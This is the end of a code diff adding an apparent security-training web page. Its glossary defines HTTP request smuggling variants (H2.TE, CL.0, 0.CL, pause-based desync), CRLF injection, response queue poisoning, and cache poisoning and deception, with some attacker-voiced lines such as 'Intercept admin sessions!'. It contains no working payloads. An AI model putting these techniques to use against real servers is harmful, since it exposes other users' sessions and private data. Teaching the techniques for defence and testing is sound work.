+  {t:'H2.TE',c:'cyan',d:'Inject Transfer-Encoding: chunked in HTTP/2 header. Spec says strip it — if not stripped during downgrade, HTTP/1 back-end processes chunked body. Desync!'},
+  {t:'CL.0',c:'purple',d:'Server ignores Content-Length on some endpoints. Any body sent = treated as next request. No chunked encoding needed. Works from browsers!'},
+  {t:'0.CL',c:'purple',d:'Front-end ignores Content-Length that back-end processes. Was thought unexploitable (deadlock). Now exploitable using pause + early-response gadget.'},
+  {t:'Desync',c:'red',d:'De-synchronization. Front-end and back-end disagree about request boundaries. The gap between their interpretations = your attack surface.'},
+  {t:'CRLF Injection',c:'green',d:'Carriage Return (\\r) + Line Feed (\\n). In HTTP/2 headers, no special meaning. After downgrade to HTTP/1 — header separator! Use to inject extra headers.'},
+  {t:'Response Queue Poisoning',c:'purple',d:'Split one request into two on back-end. Back-end sends two responses. You get one, another user gets the other. Intercept admin sessions!'},
+  {t:'Request Tunnelling',c:'cyan',d:'Inject inner HTTP/1 request inside HTTP/2 headers via CRLF. Works even without connection reuse between front-end and back-end.'},
+  {t:'Client-Side Desync',c:'green',d:'Use browser-compatible fetch() to desync the victim\'s own browser connection. Attacks single-server sites and intranets.'},
+  {t:'Pause-Based Desync',c:'yellow',d:'Send headers, pause 61 seconds, then body. Back-end times out, sends early response, processes your smuggled prefix. Reveals hidden vulnerabilities.'},
+  {t:'Cache Poisoning',c:'red',d:'Make cache store YOUR malicious response under a legitimate URL. Every future visitor gets your content. Persistent attack.'},
+  {t:'Cache Deception',c:'orange',d:'Make cache store VICTIM\'S private content under a static URL. You fetch that URL and read their secrets.'},
+  {t:'Differential Response',c:'yellow',d:'Detection technique: send attack + normal request on separate connections. If normal gets unexpected response (like 404) — smuggling confirmed.'},
+  {t:'Timing Attack',c:'yellow',d:'Detection: send partial request. If server hangs waiting for more data — timing delay confirms the vulnerability variant.'},
+  {t:'Keep-Alive',c:'cyan',d:'Connection: keep-alive header keeps TCP connection open between front-end and back-end. Required for most smuggling attacks.'},
+  {t:'Turbo Intruder',c:'purple',d:'Burp extension that allows scripted request sending with precise timing control. Required for pause-based desync attacks.'},
+  {t:'X-SSL-CLIENT-CN',c:'green',d:'Header added by front-end after mutual TLS client cert verification. Contains the client\'s common name/username. Back-end trusts it blindly.'},
+];
+
+function buildGlos(){
+  const colorMap={cyan:'var(--cyan)',orange:'var(--orange)',yellow:'var(--yellow)',red:'var(--red)',green:'var(--green)',purple:'var(--purple)'};
+  document.getElementById('glos-grid').innerHTML=GLOS.map(g=>`
+    <div class="gcard" onclick="this.querySelector('.gdef').classList.toggle('open')">
+      <div class="gterm" style="color:${colorMap[g.c]}">${esc(g.t)}</div>
+      <div class="gdef">${esc(g.d)}</div>
+      <div style="font-size:9px;color:rgba(0,255,65,.2);margin-top:4px;">▼ tap</div>
+    </div>
+  `).join('');
+}
+
+// ═══════════════════════════════════════════
+// INIT
+// ═══════════════════════════════════════════
+buildDash();
+buildRanks();
+buildGlos();
+updateUI();
+</script>
+<script src="assets/auth.bundle.js"></script>
+</body></html>
